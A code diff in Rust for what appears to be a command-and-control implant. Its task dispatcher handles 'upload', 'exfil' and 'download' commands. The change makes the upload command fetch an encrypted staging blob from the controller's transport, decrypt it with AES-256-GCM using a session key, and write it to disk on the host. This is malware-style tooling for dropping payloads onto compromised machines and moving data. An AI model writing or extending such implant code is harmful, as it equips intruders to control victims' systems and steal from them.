@@ -55,6 +55,7 @@ pub fn dispatch(
     task: &Task,
     state: &Arc<AgentState>,
     transport: &SharedTransport,
+    session_key: &[u8; 32],
 ) -> Option<TaskResponse> {
     match task.kind.as_str() {
         "exit" => return None,
@@ -91,7 +92,7 @@ pub fn dispatch(
         }
 
         "upload" => {
-            Some(cmd_upload(task, state, transport))
+            Some(cmd_upload(task, state, transport, session_key))
         }
 
         "exfil" => {
@@ -329,7 +330,8 @@ fn cmd_download(task: &Task, state: &Arc<AgentState>, transport: &SharedTranspor
 }
 
 // ── UPLOAD ────────────────────────────────────────────────────────────────────
-fn cmd_upload(task: &Task, state: &Arc<AgentState>, transport: &SharedTransport) -> TaskResponse {
+fn cmd_upload(task: &Task, state: &Arc<AgentState>, transport: &SharedTransport,
+              session_key: &[u8; 32]) -> TaskResponse {
     let staging_src = task.arg_str("staging_path");
     let file_name   = task.arg_str("filename");
     let dest_path   = task.arg_str("dest_path");
@@ -367,7 +369,12 @@ fn cmd_upload(task: &Task, state: &Arc<AgentState>, transport: &SharedTransport)
     }
 
     match transport.download(staging_src) {
-        Some(data) if !data.is_empty() => {
+        Some(enc_data) if !enc_data.is_empty() => {
+            // Decrypt the staging blob (AES-256-GCM, session_key wrapped)
+            let data = match crate::crypto::decrypt_staging(&enc_data, session_key) {
+                Some(d) => d,
+                None => return TaskResponse::err(task, "ERROR: staging decrypt failed".to_string()),
+            };
             match std::fs::write(&save_path, &data) {
                 Ok(_)  => TaskResponse::ok(task, format!("OK: Saved {} ({} bytes) to {}", file_name, data.len(), save_path.display())),
                 Err(e) => TaskResponse::err(task, format!("ERROR: write {}: {}", save_path.display(), e)),
